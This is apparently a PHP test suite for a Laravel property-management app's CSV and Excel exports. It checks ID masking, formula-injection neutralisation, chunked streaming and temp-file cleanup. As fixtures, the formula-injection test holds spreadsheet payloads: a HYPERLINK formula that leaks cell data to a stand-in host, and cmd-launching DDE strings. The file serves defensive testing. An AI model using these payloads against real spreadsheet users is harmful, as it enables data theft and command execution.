<?php

declare(strict_types=1);

use App\Exports\ExportCell;
use App\Exports\ExportFormat;
use App\Exports\ListExports;
use App\Exports\ListExportWriter;
use App\Exports\QueryListExport;
use App\Models\Organization;
use App\Models\User;
use Illuminate\Support\Facades\DB;
use Illuminate\Support\Facades\File;
use Modules\Properties\Enums\OwnerIdType;
use Modules\Properties\Enums\OwnerType;
use Modules\Properties\Models\Unit;
use Symfony\Component\HttpFoundation\StreamedResponse;
use Tests\Fixtures\Exports\ProbeList;

require_once __DIR__.'/helpers.php';

/*
 * P02-07: what an export never contains and how it is sent. Encrypted
 * fields (ID numbers) are never exported, masked at most; text that a
 * spreadsheet would run as a formula is neutralised in CSV and Excel; a
 * long list streams a chunk at a time without being held in memory; and
 * nothing is left on the server (ARCHITECTURE.md § 2, AGENT.md § 5).
 */

beforeEach(function () {
    seedOrganizationRoles();
    $this->acme = Organization::factory()->create(['slug' => 'acme-homes', 'name' => 'Acme Homes']);
    $this->owner = joinAs(User::factory()->create(['name' => 'Ada Owner']), $this->acme);
    $this->exportsTemp = storage_path('framework/testing/exports-'.bin2hex(random_bytes(6)));
    app()->instance(ListExportWriter::class, new ListExportWriter($this->exportsTemp));
});

afterEach(function () {
    File::deleteDirectory($this->exportsTemp);
    ProbeList::$rows = 3;
    ProbeList::$failAfter = null;
    exportsFreshRequest();
});

it('never exports an encrypted value: ID numbers are masked, in CSV and Excel', function () {
    $owner = ownerIn($this->acme, ['first_name' => 'Ngozi', 'last_name' => 'Eze', 'id_type' => OwnerIdType::Nin, 'id_value' => '12345678901']);
    $company = ownerIn($this->acme, ['type' => OwnerType::Company, 'company_name' => 'Eze Holdings', 'first_name' => null, 'last_name' => null, 'id_type' => OwnerIdType::Cac, 'id_value' => 'RC 7654321']);
    $stored = DB::table('owner_profiles')->whereIn('id', [$owner->id, $company->id])->pluck('id_value')->all();
    expect($stored)->toHaveCount(2)->each->not->toContain('12345678901');

    foreach (['csv', 'xlsx'] as $format) {
        $download = openDownload($this->owner, pressExport($this->owner, '/owners', 'owners', $format))->assertOk();
        $content = $download->streamedContent();
        $rows = fileRows($content, $format);

        expect(exportColumn($rows, 'Name'))->toBe(['Eze Holdings', 'Ngozi Eze'])
            ->and(exportColumn($rows, 'ID (masked)'))->toBe([OwnerIdType::Cac->label().' ···4321', 'NIN ···8901']);

        $plain = $format === 'csv' ? $content : implode("\n", array_map(fn (array $row): string => implode(',', $row), $rows)).xlsxSheetXml($content);

        expect($plain)->not->toContain('12345678901')
            ->not->toContain('7654321')
            ->not->toContain($stored[0])
            ->not->toContain($stored[1]);
    }

    // No list's columns name a raw ID or bank number.
    foreach (app(ListExports::class)->keys() as $key => $class) {
        $headers = array_map(fn ($column): string => mb_strtolower($column->header), app($class)->columns($this->owner));
        expect($headers)->not->toContain('id number')->not->toContain('account number')->not->toContain('bank account');
    }
});

it('neutralises formula injection in CSV and Excel, keeping plain numbers', function () {
    ownerIn($this->acme, [
        'type' => OwnerType::Company,
        'company_name' => '=HYPERLINK("http://evil.example/?d="&A2,"Click")',
        'first_name' => null,
        'last_name' => null,
        'phone' => '+2348031234567',
        'address' => '-2+3+cmd|\' /C calc\'!D2',
        'lga' => '@SUM(1+1)',
        'notes' => "+cmd|'/C notepad'!A0",
    ]);

    $csv = openDownload($this->owner, pressExport($this->owner, '/owners', 'owners'))->streamedContent();
    $xlsx = openDownload($this->owner, pressExport($this->owner, '/owners', 'owners', 'xlsx'))->streamedContent();

    foreach ([csvRows($csv), xlsxRows($xlsx)] as $rows) {
        $row = array_combine($rows[0], $rows[1]);

        expect($row['Name'])->toBe('\'=HYPERLINK("http://evil.example/?d="&A2,"Click")')
            ->and($row['Address'])->toBe('\'-2+3+cmd|\' /C calc\'!D2')
            ->and($row['LGA'])->toBe("'@SUM(1+1)")
            ->and($row['Notes'])->toBe("'+cmd|'/C notepad'!A0")
            // A phone number is a plain number: kept as it is.
            ->and($row['Phone'])->toBe('+2348031234567');
    }

    // Excel cells are text, never formulas.
    $xml = xlsxSheetXml($xlsx);
    expect($xml)->not->toContain('<f>')
        ->toContain('t="inlineStr"');
});

it('neutralises every dangerous first character, and nothing else', function (string $text, string $cell) {
    expect(ExportCell::value($text))->toBe($cell);
})->with([
    ['=1+1', "'=1+1"],
    ['+44 cmd', "'+44 cmd"],
    ['-x', "'-x"],
    ['@foo', "'@foo"],
    ["\tTabbed", "'\tTabbed"],
    ["\rReturn", "'\rReturn"],
    ['-1', '-1'],
    ['+2348031234567', '+2348031234567'],
    ['12.50', '12.50'],
    ['Palm Court', 'Palm Court'],
    ["O'Brien = owner", "O'Brien = owner"],
]);

it('streams a 5,000-row export a chunk at a time, without holding the list in memory', function (string $format) {
    $building = buildingIn($this->acme, ['name' => 'Palm Court', 'slug' => 'palm-court']);
    $now = now();
    foreach (array_chunk(range(1, 5000), 1000) as $chunk) {
        DB::table('units')->insert(array_map(fn (int $i): array => [
            'organization_id' => $this->acme->id,
            'property_id' => $building->id,
            'unit_label' => "Flat {$i}",
            'unit_type' => 'apartment',
            'description' => str_repeat('A bright flat with a balcony. ', 8),
            'base_rent_kobo' => 150_000_000 + $i,
            'service_charge_kobo' => 10_000_000,
            'status' => 'vacant',
            'created_at' => $now,
            'updated_at' => $now,
        ], $chunk));
    }

    $download = openDownload($this->owner, pressExport($this->owner, '/units', 'units', $format))->assertOk();
    expect($download->baseResponse)->toBeInstanceOf(StreamedResponse::class);

    // Send it as the server would, counting the bytes as they leave.
    $bytes = 0;
    $lines = 0;
    $selects = [];
    DB::listen(function ($query) use (&$selects): void {
        if (str_starts_with($query->sql, 'select') && str_contains($query->sql, '`units`')) {
            $selects[] = $query->sql;
        }
    });
    gc_collect_cycles();
    $before = memory_get_usage();
    memory_reset_peak_usage();
    ob_start(function (string $buffer) use (&$bytes, &$lines): string {
        $bytes += strlen($buffer);
        $lines += substr_count($buffer, "\r\n");

        return '';
    }, 8192);
    $download->baseResponse->sendContent();
    ob_end_clean();
    $streamed = memory_get_peak_usage() - $before;

    // What reading the whole list at once would take, for comparison.
    gc_collect_cycles();
    $before = memory_get_usage();
    memory_reset_peak_usage();
    $all = inOrganization($this->acme, fn () => Unit::query()->with('property')->get());
    $whole = memory_get_peak_usage() - $before;
    expect($all)->toHaveCount(5000);
    unset($all);

    expect($bytes)->toBeGreaterThan(100_000)
        // Read in chunks of 500 (plus the count), never all at once.
        ->and(count(array_filter($selects, fn (string $sql): bool => str_contains($sql, 'limit '.QueryListExport::CHUNK))))->toBeGreaterThanOrEqual(10)
        ->and($streamed)->toBeLessThan(intdiv($whole, 2))
        ->and($streamed)->toBeLessThan(16 * 1024 * 1024);

    if ($format === 'csv') {
        expect($lines)->toBe(5001);
    }

    // Nothing is left on the server.
    expect(File::isDirectory($this->exportsTemp) ? File::allFiles($this->exportsTemp, true) : [])->toBe([])
        ->and(File::isDirectory($this->exportsTemp) ? File::directories($this->exportsTemp) : [])->toBe([]);
})->with(['csv', 'xlsx']);

it('leaves no temporary file behind when an Excel export fails half way, and sends no half workbook', function () {
    ProbeList::$rows = 10;
    ProbeList::$failAfter = 4;
    $writer = app(ListExportWriter::class);
    $response = $writer->response(new ProbeList, $this->owner, [], ExportFormat::Xlsx, 'probe.xlsx');

    $sent = '';
    ob_start(function (string $buffer) use (&$sent): string {
        $sent .= $buffer;

        return '';
    });

    try {
        expect(fn () => $response->sendContent())->toThrow(RuntimeException::class, 'The list could not be read.');
    } finally {
        ob_end_clean();
    }

    expect($sent)->toBe('')
        ->and(File::isDirectory($this->exportsTemp) ? File::directories($this->exportsTemp) : [])->toBe([]);

    // The same list in full works, and cleans up too.
    ProbeList::$failAfter = null;
    $rows = xlsxRows((function () use ($writer): string {
        ob_start();
        $writer->response(new ProbeList, $this->owner, [], ExportFormat::Xlsx, 'probe.xlsx')->sendContent();

        return (string) ob_get_clean();
    })());
    expect($rows)->toBe([['Number'], ...array_map(fn (int $i): array => [(string) $i], range(1, 10))])
        ->and(File::directories($this->exportsTemp))->toBe([]);
});
